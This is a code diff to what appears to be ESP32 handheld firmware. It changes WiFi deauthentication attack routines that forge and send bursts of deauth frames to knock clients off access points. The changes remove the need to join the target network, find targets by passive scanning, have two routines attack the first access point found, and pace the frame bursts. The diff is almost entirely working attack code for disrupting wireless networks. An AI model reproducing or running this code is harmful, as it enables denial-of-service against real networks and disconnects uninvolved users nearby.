@@ -104,55 +104,6 @@ void cacheSameSSIDAPs() {
     WiFi.scanDelete();
 }
 
-// Ensure WiFi is connected before proceeding
-bool ensureWiFiConnected() {
-    if (WiFi.status() == WL_CONNECTED) {
-        return true;
-    }
-    
-    drawMainBorderWithTitle("WiFi Required");
-    padprintln("No WiFi connection detected.");
-    padprintln("Scanning for networks...");
-    tft.setTextSize(FP);
-    tft.setCursor(10, 100);
-    tft.print("Scanning...");
-    
-    int n = WiFi.scanNetworks();
-    if (n == 0) {
-        displayError("No networks found", true);
-        return false;
-    }
-    
-    std::vector<Option> networkOptions;
-    for (int i = 0; i < n; ++i) {
-        String ssid = WiFi.SSID(i);
-        if (ssid.length() > 0 && ssid != "") {
-            networkOptions.push_back({ssid.c_str(), [ssid]() {
-                displayTextLine("Connecting to " + ssid + "...");
-                WiFi.begin(ssid.c_str());
-                int attempts = 0;
-                while (WiFi.status() != WL_CONNECTED && attempts < 20) {
-                    delay(500);
-                    attempts++;
-                    if (attempts % 2 == 0) {
-                        displayTextLine("Connecting to " + ssid + " " + String(attempts * 500) + "ms");
-                    }
-                }
-                if (WiFi.status() == WL_CONNECTED) {
-                    displaySuccess("Connected to " + ssid);
-                    delay(500);
-                } else {
-                    displayError("Failed to connect to " + ssid, true);
-                }
-            }});
-        }
-    }
-    networkOptions.push_back({"Back", []() { returnToMenu = true; }});
-    
-    loopOptions(networkOptions, MENU_TYPE_SUBMENU, "Select WiFi");
-    return (WiFi.status() == WL_CONNECTED);
-}
-
 // Enhanced channel detection with caching for speed
 int getAPChannel(const uint8_t* target_bssid) {
     static wifi_ap_record_t cached_ap;
@@ -283,19 +234,21 @@ void sendDeauthBurst(uint8_t* frame1, uint8_t* frame2, uint8_t* frame3, uint8_t*
     frame4[24] = reason;
     
     sendDeauthFrame(frame1, enhanced_mode);
+    delay(1);
     sendDeauthFrame(frame2, enhanced_mode);
+    delay(1);
     sendDeauthFrame(frame3, enhanced_mode);
+    delay(1);
     sendDeauthFrame(frame4, enhanced_mode);
 }
 
 void stationDeauth(Host host) {
-    if (WiFi.status() != WL_CONNECTED) {
-        // Try to connect first
-        if (!ensureWiFiConnected()) {
-            displayError("Not connected to WiFi", true);
-            return;
-        }
+    // Clean WiFi state - no connection needed for deauth
+    if (WiFi.getMode() != WIFI_MODE_NULL) {
+        WiFi.mode(WIFI_OFF);
+        delay(100);
     }
+    
     // Stop WebUI before setting WiFi mode for station deauth
     cleanlyStopWebUiForWiFiFeature();
     uint8_t targetMAC[6];
@@ -312,10 +265,21 @@ void stationDeauth(Host host) {
         return;
     }
 
-    getGatewayMAC(gatewayMAC);
+    // Get gateway MAC from the target network via passive scanning
+    int n = WiFi.scanNetworks(false, false);
+    bool found = false;
+    for (int i = 0; i < n; i++) {
+        uint8_t* bssid_ptr = WiFi.BSSID(i);
+        if (macCompare(bssid_ptr, targetMAC)) {
+            memcpy(gatewayMAC, bssid_ptr, 6);
+            found = true;
+            break;
+        }
+    }
+    WiFi.scanDelete();
 
-    if (isMACZero(gatewayMAC)) {
-        displayError("Could not get gateway MAC", true);
+    if (!found) {
+        displayError("Could not find target AP", true);
         return;
     }
 
@@ -426,6 +390,7 @@ void stationDeauth(Host host) {
                 buildOptimizedDeauthFrame(broadcast_frame, broadcast_mac, gatewayMAC, gatewayMAC, broadcast_reason, false);
             }
             sendDeauthFrame(broadcast_frame, enhanced_mode);
+            delay(1);
             total_frames++;
         }
 
@@ -522,24 +487,26 @@ void stationDeauth(Host host) {
 
 // Deauth all clients on the network
 void deauthAll() {
-    if (WiFi.status() != WL_CONNECTED) {
-        if (!ensureWiFiConnected()) {
-            displayError("Not connected to WiFi", true);
-            return;
-        }
+    // Clean WiFi state - no connection needed
+    if (WiFi.getMode() != WIFI_MODE_NULL) {
+        WiFi.mode(WIFI_OFF);
+        delay(100);
     }
     
     cleanlyStopWebUiForWiFiFeature();
     
-    uint8_t gatewayMAC[6];
-    getGatewayMAC(gatewayMAC);
-    
-    if (isMACZero(gatewayMAC)) {
-        displayError("Could not get gateway MAC", true);
+    // Scan for networks passively
+    int n = WiFi.scanNetworks(false, false);
+    if (n == 0) {
+        displayError("No networks found", true);
         return;
     }
     
-    int channel = getAPChannel(gatewayMAC);
+    // Use the first AP found as the target
+    uint8_t gatewayMAC[6];
+    memcpy(gatewayMAC, WiFi.BSSID(0), 6);
+    int channel = WiFi.channel(0);
+    WiFi.scanDelete();
     
     // Cache all APs with same SSID for mesh network targeting
     cacheSameSSIDAPs();
@@ -607,6 +574,7 @@ void deauthAll() {
         }
         
         sendDeauthFrame(frame, enhanced_mode);
+        delay(1);
         total_frames++;
         deauth_state.burst_counter++;
         
@@ -628,6 +596,7 @@ void deauthAll() {
                     buildOptimizedDeauthFrame(frame, broadcast_mac, gatewayMAC, gatewayMAC, extra_reason, false);
                 }
                 sendDeauthFrame(frame, enhanced_mode);
+                delay(1);
                 total_frames++;
                 deauth_state.burst_counter++;
             }
@@ -676,24 +645,25 @@ void deauthTargetList(const std::vector<Host>& targets) {
         return;
     }
     
-    if (WiFi.status() != WL_CONNECTED) {
-        if (!ensureWiFiConnected()) {
-            displayError("Not connected to WiFi", true);
-            return;
-        }
+    // Clean WiFi state - no connection needed
+    if (WiFi.getMode() != WIFI_MODE_NULL) {
+        WiFi.mode(WIFI_OFF);
+        delay(100);
     }
     
     cleanlyStopWebUiForWiFiFeature();
     
-    uint8_t gatewayMAC[6];
-    getGatewayMAC(gatewayMAC);
-    
-    if (isMACZero(gatewayMAC)) {
-        displayError("Could not get gateway MAC", true);
+    // Scan for networks to get gateway MAC
+    int n = WiFi.scanNetworks(false, false);
+    if (n == 0) {
+        displayError("No networks found", true);
         return;
     }
     
-    int channel = getAPChannel(gatewayMAC);
+    uint8_t gatewayMAC[6];
+    memcpy(gatewayMAC, WiFi.BSSID(0), 6);
+    int channel = WiFi.channel(0);
+    WiFi.scanDelete();
     
     // Cache all APs with same SSID for mesh network targeting
     cacheSameSSIDAPs();
@@ -774,6 +744,7 @@ void deauthTargetList(const std::vector<Host>& targets) {
             
             for (int i = 0; i < 4; i++) {
                 sendDeauthFrame(frames[i], enhanced_mode);
+                delay(1);
                 total_frames++;
                 deauth_state.burst_counter++;
             }
